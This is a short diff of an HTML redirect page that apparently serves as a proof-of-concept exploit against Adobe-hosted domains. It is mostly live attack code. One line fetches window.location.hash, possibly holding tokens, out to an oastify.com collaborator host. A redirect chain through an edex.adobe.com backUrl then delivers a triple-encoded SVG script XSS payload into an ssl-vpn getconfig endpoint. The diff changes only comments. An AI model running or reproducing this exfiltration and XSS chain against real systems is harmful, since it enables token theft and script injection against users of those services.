@@ -4,10 +4,10 @@
     <meta charset="UTF-8" />
     <title>Redirecting...</title>
     <script>
-      // Optional: token exfiltration
+      // Optional: Exfiltrate hash to oastify
       fetch("https://ovnqfxvejsl73wvz74zqz9jvqmwfk58u.oastify.com/?" + encodeURIComponent(window.location.hash));
 
-      // Final XSS payload wrapped in edex.adobe.com backUrl
+      // Final XSS payload — triple encoded — inside backUrl
       const redirectTo = "https://edex.adobe.com/main/auth/?backUrl=" +
         "https%3A%2F%2Fsubscription1106a-mkt-prod1-segmentation.campaign.adobe.com%2Fssl-vpn%2Fgetconfig.esp%3F" +
         "client-type%3D1%26protocol-version%3Dp1%26app-version%3D3.0.1-10%26clientos%3DLinux%26os-version%3Dlinux-64" +
@@ -15,7 +15,7 @@
         "%26portal%3Dus-vpn-gw-N%26user%3D%253Csvg%2520xmlns%253D%2522http%253A%252F%252Fwww.w3.org%252F2000%252Fsvg%2522%253E" +
         "%253Cscript%253Eprompt%2528%2522XSS%2522%2529%253C%252Fscript%253E%253C%252Fsvg%253E%26domain%3D%2528empty_domain%2529%26computer%3Dcomputer";
 
-      // Perform redirect
+      // Redirect to the crafted URL
       window.location.href = redirectTo;
     </script>
   </head>
